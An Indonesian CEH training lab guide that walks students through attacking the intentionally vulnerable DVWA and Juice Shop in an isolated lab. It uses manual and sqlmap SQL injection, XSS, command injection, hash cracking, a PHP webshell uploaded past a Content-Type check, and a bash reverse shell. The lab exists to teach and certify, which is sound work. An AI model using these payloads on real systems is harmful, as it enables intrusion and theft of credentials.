# Lab 05 - Meretas aplikasi web

Modul CEH 14 - Hacking Web Applications | 90 menit | Level 2

## Yang dibuktikan di lab ini

Di akhir jam ini Anda sudah mengeluarkan seluruh tabel pengguna dari sebuah
aplikasi web lewat SQL Injection yang Anda ketik sendiri, lalu mengulanginya
dengan sqlmap, dan Anda sudah menanam satu webshell yang menjalankan perintah
di server target. Ini menyentuh empat domain exam sekaligus: SQL Injection
(modul tersendiri), Hacking Web Applications, XSS, dan file upload yang tidak
divalidasi.

## Waktu yang dibutuhkan

Jalur wajib sekitar 60 menit. Tantangan Juice Shop dan tantangan lanjutan buat
sisa waktu, tidak wajib selesai.

## Peringatan dan batas

DVWA dan Juice Shop adalah aplikasi yang SENGAJA dibuat rapuh. Keduanya cuma
boleh jalan di dalam lab ini.

- Jaringan lab ini internal. Dari dalam toolbox tidak ada jalan ke internet,
  tidak ada jalan ke jaringan kelas, tidak ada jalan ke laptop peserta lain.
  Kalau Anda mengarahkan nmap ke subnet kelas, nmap menjawab "failed to
  determine route" dan nol host discan. Itu benar, bukan kerusakan.
- Port sudah diikat ke 127.0.0.1, jadi cuma laptop Anda sendiri yang bisa
  membuka DVWA dan Juice Shop. Peserta lain tidak bisa.
- Teknik di sini cuma sah dipakai di target yang Anda miliki atau yang Anda
  punya izin tertulis untuk diuji. Memakainya di aplikasi orang lain itu
  bukan latihan, itu tindak pidana.

## Cara nyalain

```
./lab up 05          # macOS, Linux
.\lab.cmd up 05      # Windows
```

Lab ini menyalakan tiga container, dan salah satunya butuh sekitar 40 detik
sebelum siap. Tunggu sampai `./lab up` selesai, jangan buru-buru.

Buka di browser:

- DVWA, jalur wajib: <http://localhost:8500>
- Juice Shop, tantangan: <http://localhost:8501>

Terminal penyerang: `./lab sh 05`

## Peta lab

| Container | Perannya | Alamat dari dalam toolbox |
|---|---|---|
| toolbox | tempat Anda mengetik | - |
| dvwa | target wajib, aplikasi web PHP | `dvwa` port 80 |
| dvwa-db | database MySQL milik DVWA | `dvwa-db` port 3306 |
| juiceshop | target tantangan | `juiceshop` port 3000 |

Dari dalam toolbox, panggil target memakai NAMANYA, bukan localhost.
`curl http://dvwa/` jalan, `curl http://localhost/` tidak jalan. Alasannya:
setiap container punya localhost sendiri.

Perhatikan `dvwa-db` tidak punya port yang dipublish ke laptop Anda. Itu
disengaja. Satu-satunya cara melihat isi database itu adalah lewat SQL
Injection di langkah 2, persis seperti di dunia nyata.

## Persiapan sekali di awal

DVWA minta database-nya dibuat dulu, dan mulai di tingkat keamanan paling
rendah supaya semua latihan jalan.

1. Buka <http://localhost:8500>. Anda diarahkan ke halaman login.
2. Masuk dengan **admin / password**.
3. Kalau muncul halaman "Database Setup", tekan tombol **Create / Reset
   Database** di bagian bawah. Halaman lalu mengembalikan Anda ke login,
   masuk lagi dengan admin / password.
4. Buka menu **DVWA Security** di kiri, pilih **Low**, tekan Submit. Sepanjang
   jalur wajib, biarkan di Low. Menaikkannya ada di tantangan lanjutan.

## LANGKAH WAJIB

### 1. SQL Injection manual, ini yang porsinya paling besar

Buka menu **SQL Injection**. Ada satu kotak "User ID". Isi angka `1`, tekan
Submit. Aplikasi menampilkan nama pemilik ID itu. Sekarang kita rusak query di
baliknya.

**1a. Buktikan ada celahnya.** Masukkan satu tanda kutip tunggal:

```
'
```

Yang mestinya kelihatan: pesan error SQL, kira-kira "You have an error in your
SQL syntax". Error itu bukti bahwa apa yang Anda ketik masuk ke query tanpa
disaring.

**1b. Tarik semua baris sekaligus.** Masukkan:

```
1' OR '1'='1
```

Yang mestinya kelihatan: bukan cuma satu nama, tapi kelima pengguna
(admin, Gordon Brown, Hack Me, Pablo Picasso, Bob Smith). Anda baru saja
mengubah kondisi WHERE supaya selalu benar.

**1c. Cari tahu ada berapa kolom.** UNION cuma jalan kalau jumlah kolomnya
cocok. Coba naik dari satu:

```
1' ORDER BY 1#
1' ORDER BY 2#
1' ORDER BY 3#
```

Yang mestinya kelihatan: `ORDER BY 3` memicu error, dua yang lain tidak. Berarti
query ini punya 2 kolom.

**1d. Bocorkan versi database dan nama database.** Sekarang pakai UNION dengan
2 kolom:

```
1' UNION SELECT @@version, database()#
```

Yang mestinya kelihatan: baris tambahan dengan First name berisi versi MySQL
(contohnya `8.4.11`) dan Surname berisi `dvwa`.

**1e. Keluarkan seluruh kredensial.** Inti dari SQL Injection:

```
1' UNION SELECT user, password FROM users#
```

Yang mestinya kelihatan: lima baris user beserta hash password-nya. Salin
semuanya ke catatan, itu bahan langkah 4.

### 2. SQL Injection dengan sqlmap

Yang barusan Anda ketik tangan, sekarang diotomatiskan. Buka terminal
penyerang: `./lab sh 05`.

sqlmap butuh cookie sesi Anda supaya bisa login seperti Anda. Ambil dari
browser: buka Developer Tools (F12) -> Application atau Storage -> Cookies ->
localhost, salin nilai **PHPSESSID**. Lalu di terminal, ganti `SESI_ANDA`
dengan nilai itu:

```
sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=SESI_ANDA; security=low" \
  --batch --dbs
```

Yang mestinya kelihatan: sqlmap memastikan parameter `id` injectable lewat
beberapa teknik (boolean-based, error-based, time-based, UNION), lalu menyebut
tiga database: `dvwa`, `information_schema`, `performance_schema`.

Sekarang keluarkan tabel users, kali ini tanpa mengetik satu pun query SQL:

```
sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=SESI_ANDA; security=low" \
  --batch -D dvwa -T users -C user,password --dump
```

Yang mestinya kelihatan: tabel rapi berisi lima user dan hash-nya, sama dengan
yang Anda dapat manual di langkah 1e.

### 3. XSS, reflected dan stored

**3a. Reflected.** Buka menu **XSS (Reflected)**. Kotaknya minta nama. Isi:

```
<script>alert('CEH')</script>
```

Yang mestinya kelihatan: kotak dialog "CEH" muncul. Nama Anda dipantulkan
kembali ke halaman tanpa disaring, dan browser menjalankannya sebagai kode.
Reflected berarti hanya berjalan di tautan yang Anda kirim ke korban.

**3b. Stored.** Buka menu **XSS (Stored)**. Ini buku tamu. Isi Name dengan
`CEH`, Message dengan:

```
<script>alert(document.cookie)</script>
```

Tekan Sign Guestbook. Yang mestinya kelihatan: dialog muncul begitu halaman
dimuat. Sekarang refresh halaman. Dialog muncul LAGI. Bedanya dengan reflected:
skrip ini tersimpan di database, jadi menyerang SETIAP orang yang membuka
halaman itu, bukan cuma Anda.

### 4. Command injection dan crack hash

**4a. Command injection.** Buka menu **Command Injection**. Kotaknya minta
alamat IP untuk di-ping. Isi:

```
127.0.0.1; id; uname -m
```

Yang mestinya kelihatan: hasil ping seperti biasa, LALU di bawahnya keluaran
`uid=33(www-data)` dan arsitektur mesin. Tanda titik koma mengakhiri perintah
ping dan menyelipkan perintah Anda sendiri. Ini eksekusi perintah di server.

**4b. Crack hash yang Anda curi di langkah 1e.** Di dunia nyata hash password
tidak langsung bisa dipakai login. Di terminal penyerang, buat berkasnya lalu
pecahkan dengan John:

```
cat > hash.txt <<'EOF'
admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
1337:8d3533d75ae2c3966d7e0d4fcc69216b
pablo:0d107d09f5bbe40cade3de5c71e9e9b7
smithy:5f4dcc3b5aa765d61d8327deb882cf99
EOF

john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou-kecil.txt hash.txt
john --format=raw-md5 --show hash.txt
```

Yang mestinya kelihatan: John memecahkan sebagian password (`admin` jadi
`password`, `gordonb` jadi `abc123`, `pablo` jadi `letmein`, `smithy` jadi
`password`). Password `1337` tidak ketemu karena tidak ada di wordlist kecil.
Ada wordlist nama di `/lab/files/nama-umum.txt` yang bisa Anda coba tambahan.

Catatan exam: nama perkakas yang paling sering muncul di soal adalah
**hashcat** dan **John the Ripper**. Di kelas ini yang dipakai John, karena
hashcat butuh GPU yang tidak ada di dalam container. Hafalkan hashcat sebagai
nama, latih tangan Anda dengan John.

### 5. File upload bypass

Ini butuh menaikkan keamanan dulu, supaya ada yang perlu di-bypass. Buka
**DVWA Security**, set ke **Medium**, Submit. Lalu buka menu **File Upload**.

Di terminal penyerang, buat webshell PHP:

```
printf '<?php system($_GET["c"]); ?>' > /lab/shell.php
```

Kembali ke browser, coba unggah `shell.php` apa adanya lewat halaman File
Upload. Yang mestinya kelihatan: DITOLAK, "We can only accept JPEG or PNG
images". Di level Medium, DVWA memeriksa header Content-Type.

Tipuannya: kirim berkas yang sama tapi bilang ke server ini gambar. Cara
paling gampang lewat terminal, karena kita bisa mengatur Content-Type sendiri.
Ambil PHPSESSID Anda seperti di langkah 2, lalu:

```
curl -b "PHPSESSID=SESI_ANDA; security=medium" \
  -F "MAX_FILE_SIZE=100000" \
  -F "uploaded=@/lab/shell.php;type=image/jpeg" \
  -F "Upload=Upload" \
  http://dvwa/vulnerabilities/upload/
```

Yang mestinya kelihatan: `../../hackable/uploads/shell.php succesfully
uploaded!`. Header-nya kita palsukan jadi image/jpeg, isinya tetap PHP.

Sekarang jalankan webshell itu. Perhatikan tidak perlu cookie sama sekali,
siapa pun yang tahu URL-nya bisa memanggilnya:

```
curl "http://dvwa/hackable/uploads/shell.php?c=id;pwd"
```

Yang mestinya kelihatan: `uid=33(www-data)` dan path folder uploads. Anda
sekarang menjalankan perintah apa pun di server target lewat satu berkas yang
diterima sebagai "gambar".

## Pertanyaan buat peserta

Jawabannya cuma ketemu kalau Anda beneran mengerjakan langkahnya.

1. Di langkah 1c, `ORDER BY` berapa yang pertama memicu error, dan apa artinya
   angka itu buat menyusun UNION di langkah 1d?
2. Hash `admin` dan `smithy` di langkah 1e nilainya sama persis. Setelah John
   memecahkannya di 4b, apa password keduanya, dan kenapa dua user berbeda
   bisa punya hash yang identik?
3. Di langkah 3, kenapa stored XSS lebih berbahaya daripada reflected XSS kalau
   dilihat dari siapa saja yang jadi korban?
4. Di langkah 5, apa persisnya yang diperiksa DVWA di level Medium, dan kenapa
   mengganti satu baris `type=image/jpeg` sudah cukup untuk melewatinya?

## Tantangan tambahan

Buat yang sudah selesai duluan, jangan menganggur.

**T1. Blind SQL Injection.** Buka menu **SQL Injection (Blind)** di DVWA. Di
sini aplikasi tidak menampilkan hasil query, cuma "User ID exists" atau
"MISSING". Buktikan Anda masih bisa menyimpulkan isinya: bandingkan
`1' AND 1=1#` dengan `1' AND 1=2#`. Lalu coba `--technique=B` di sqlmap dan
lihat dia menebak isi database satu bit demi satu.

**T2. Broken Access Control (IDOR).** Buka menu **Broken Access Control**.
Login sebagai user biasa `gordonb / abc123` di jendela terpisah. Modul ini
memutuskan boleh-tidaknya melihat sebuah profil berdasarkan cookie `user_id`,
bukan berdasarkan sesi. Ubah cookie `user_id` di browser jadi `1`, lalu minta
`?action=view&user_id=1`. Anda melihat profil admin walau login sebagai
gordonb. Ini contoh A01:2021 di OWASP Top 10.

**T3. Webshell jadi reverse shell.** Lanjutan dari langkah 5. Alih-alih
menunggu perintah lewat URL, buat target yang menelepon balik ke toolbox. Di
terminal penyerang jalankan pendengar `nc -lvnp 4444`, lalu panggil webshell
dengan perintah yang membuka koneksi ke `penyerang` port 4444
(`bash -i >& /dev/tcp/penyerang/4444 0>&1`). Anda dapat shell interaktif di
server target. `penyerang` adalah nama host toolbox di jaringan lab.

**T4. Juice Shop.** Buka <http://localhost:8501>. Ini aplikasi yang jauh lebih
mirip aplikasi modern (Angular, REST API, JWT), dan punya papan skor sendiri.
Dua tantangan pembuka:

- Login sebagai admin tanpa tahu passwordnya. Di form login, isi email dengan
  `' OR 1=1--` dan password apa saja. Anda masuk sebagai administrator. Ini
  SQL Injection yang sama konsepnya dengan langkah 1, di aplikasi yang berbeda.
- Temukan papan skor yang sengaja disembunyikan. Petunjuk: perhatikan alamat
  di address bar, aplikasi ini memakai rute di belakang tanda `#`.

## Yang GA BISA dikerjain di lab ini dan kenapa

- **SQL Injection tingkat impossible.** DVWA punya level "impossible" yang
  memakai prepared statement dan memang tidak bisa ditembus. Itu bukan
  kegagalan lab, itu contoh mitigasi yang benar: langkah 1 sampai 5 hanya
  jalan karena input disatukan ke query sebagai teks. Di dunia nyata, prepared
  statement adalah perbaikannya.
- **Menyerang aplikasi di internet.** Jaringan lab ini sengaja dikurung, jadi
  Anda tidak bisa mengarahkan sqlmap ke situs mana pun di luar. Di dunia nyata,
  pengujian seperti ini butuh izin tertulis (scope dan rules of engagement)
  sebelum satu paket pun dikirim. Tidak adanya jalan keluar di lab ini adalah
  versi teknis dari aturan itu.
- **Cracking hash yang kuat.** Hash di DVWA adalah MD5 tanpa salt, jadi pecah
  dalam sepersekian detik. Password sungguhan disimpan dengan bcrypt atau
  argon2 yang jauh lebih lambat dipecahkan. Wordlist di sini juga sengaja
  kecil. Intinya bukan kecepatannya, tapi alurnya: curi hash, lalu pecahkan
  offline.

## Cara matiin dan beberes

```
./lab down 05
```

Perintah itu menghapus container beserta volume-nya, termasuk webshell yang
Anda unggah dan database DVWA. Lab kembali bersih untuk sesi berikutnya.

## Nyambung ke exam

- SQL Injection: in-band (UNION-based dan error-based), blind (boolean-based
  dan time-based). Payload klasik `' OR '1'='1`, penentuan jumlah kolom lewat
  ORDER BY, ekstraksi lewat UNION SELECT. sqlmap sebagai perkakas otomatisasi.
- Cross-Site Scripting: reflected lawan stored, dan kenapa stored berdampak
  lebih luas.
- Command Injection lewat pemisah perintah seperti titik koma.
- Unrestricted File Upload dan bypass validasi Content-Type, berujung ke
  webshell dan remote code execution.
- Broken Access Control / IDOR, A01:2021 di OWASP Top 10.
- Password cracking dictionary attack dengan John the Ripper, hashcat sebagai
  nama yang keluar di soal.
